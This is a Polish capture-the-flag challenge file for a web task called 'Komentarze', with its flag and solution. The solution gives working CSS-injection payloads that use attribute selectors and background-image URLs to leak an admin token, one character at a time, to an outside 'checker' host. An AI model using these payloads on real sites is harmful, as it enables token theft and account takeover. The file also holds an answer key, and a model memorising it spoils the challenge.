# Komentarze

## Name
Komentarze

## URL
comments.scs.ctf

## Category
Web

## Points
50

## Flag
scs2019{b4cb1e0ae42ae1c16aa26e7ebf122a78e456c89f}

## Description
Odkryliśmy, że jeden z polityków pozwala w swoim systemie pozwala na dodawanie komentarzy. Okazało się jednak, że komuś udało się dostać na konto administratora i skasować dane. Sprawdź w jaki sposób mógł zdobyć dostęp. Nie wiadomo jak to zostało zrobione, ponieważ dodawanie komentarzy pozwala na dodawanie jedynie kilku tagów.

## Solution
Rozwiązaniem jest ustawienie tagu <style> i sprawdzanie litera po literze odpowiednim selectorem. 

### Przykład
Pierwszy komentarz:
```
<style>
#user-token[data-token^="a"]:before {background-image: url(http://checker/start/a);}
#user-token[data-token^="b"]:before {background-image: url(http://checker/start/b);}
#user-token[data-token^="c"]:before {background-image: url(http://checker/start/c);}
...
#user-token[data-token^="9"]:before {background-image: url(http://checker/start/9);}

#user-token[data-token$="a"]:after {background-image: url(http://checker/end/a);}
#user-token[data-token$="b"]:after {background-image: url(http://checker/end/b);}
#user-token[data-token$="c"]:after {background-image: url(http://checker/end/c);}
...
#user-token[data-token$="9"]:before {background-image: url(http://checker/end/9);}
</style>
```
Jeżeli znalazło literę "f" na początku i "c" na końcu drugi komentarz:
```
<style>
#user-token[data-token^="fa"]:before {background-image: url(http://checker/start/fa);}
#user-token[data-token^="fb"]:before {background-image: url(http://checker/start/fb);}
#user-token[data-token^="fc"]:before {background-image: url(http://checker/start/fc);}

#user-token[data-token^="f9"]:before {background-image: url(http://checker/start/f9);}

#user-token[data-token$="ac"]:after {background-image: url(http://checker/end/ac);}
#user-token[data-token$="bc"]:after {background-image: url(http://checker/end/bc);}
#user-token[data-token$="cc"]:after {background-image: url(http://checker/end/cc);}

#user-token[data-token$="9c"]:before {background-image: url(http://checker/end/9c);}
</style>
```

## Todo

## Created by
* Mateusz Górny